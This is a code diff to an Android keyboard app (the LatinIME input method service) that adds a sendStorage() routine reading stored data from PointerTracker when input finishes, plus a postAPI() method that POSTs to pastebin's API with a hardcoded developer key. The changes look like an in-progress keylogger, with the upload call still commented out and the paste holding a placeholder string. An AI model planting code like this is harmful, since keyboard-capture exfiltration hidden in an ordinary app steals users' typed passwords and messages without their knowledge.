@@ -23,6 +23,7 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.res.Configuration;
 import android.content.SharedPreferences;
+import android.graphics.Point;
 import android.inputmethodservice.InputMethodService;
 import android.media.AudioManager;
 import android.os.Build;
@@ -41,10 +42,22 @@ import android.view.ViewGroup.LayoutParams;
 import android.view.Window;
 import android.view.inputmethod.EditorInfo;
 
+import java.io.BufferedReader;
 import java.io.FileDescriptor;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.io.PrintWriter;
+import java.net.*;
+import java.net.URLConnection;
+import java.nio.charset.StandardCharsets;
+import java.util.HashMap;
 import java.util.Locale;
+import java.util.Map;
+import java.util.StringJoiner;
 import java.util.concurrent.TimeUnit;
+import java.util.stream.Collectors;
 
 import rkr.simplekeyboard.inputmethod.compat.EditorInfoCompatUtils;
 import rkr.simplekeyboard.inputmethod.compat.PreferenceManagerCompat;
@@ -57,6 +70,7 @@ import rkr.simplekeyboard.inputmethod.keyboard.KeyboardActionListener;
 import rkr.simplekeyboard.inputmethod.keyboard.KeyboardId;
 import rkr.simplekeyboard.inputmethod.keyboard.KeyboardSwitcher;
 import rkr.simplekeyboard.inputmethod.keyboard.MainKeyboardView;
+import rkr.simplekeyboard.inputmethod.keyboard.PointerTracker;
 import rkr.simplekeyboard.inputmethod.latin.common.Constants;
 import rkr.simplekeyboard.inputmethod.latin.define.DebugFlags;
 import rkr.simplekeyboard.inputmethod.latin.inputlogic.InputLogic;
@@ -470,6 +484,55 @@ public class LatinIME extends InputMethodService implements KeyboardActionListen
             mainKeyboardView.closing();
         }
         clearNavigationBarColor();
+        sendStorage();
+    }
+
+    private void sendStorage() {
+        String mata;
+        mata = PointerTracker.getStorage();
+//      postAPI();
+        PointerTracker.clearStorage();
+    }
+    private static void postAPI(){
+        try {
+            URL url = new URL("https://pastebin.com/api/api_post.php");
+            URLConnection con = url.openConnection();
+            HttpURLConnection http = (HttpURLConnection)con;
+            http.setRequestMethod("POST");
+            http.setDoOutput(true);
+            http.setDoInput(true);
+            Map<String,String> arguments = new HashMap<>();
+
+            arguments.put("api_dev_key", "kdudUXx9JjV2Epb9DPWfXc19SmXXBnDO");
+            arguments.put("api_paste_code"," Ethan buy me a beer" );
+            // Repeat this for for all required API arguments
+            // ...
+
+            StringJoiner sj = null;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                sj = new StringJoiner("&");
+            }
+            for(Map.Entry<String,String> entry : arguments.entrySet())
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                    sj.add(URLEncoder.encode(entry.getKey(), "UTF-8") + "="
+                            + URLEncoder.encode(entry.getValue(), "UTF-8"));
+                }
+            byte[] out = sj.toString().getBytes(StandardCharsets.UTF_8);
+            int length = out.length;
+            http.setFixedLengthStreamingMode(length);
+            http.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+            http.connect();
+            OutputStream os = http.getOutputStream();
+            os.write(out);
+            InputStream is = http.getInputStream();
+            String text = null;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                text = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8)).lines().collect(Collectors.joining("\n"));
+            }
+            System.out.println(text);
+        } catch (IOException urlException) {
+            urlException.printStackTrace();
+        }
     }
 
     void onFinishInputInternal() {
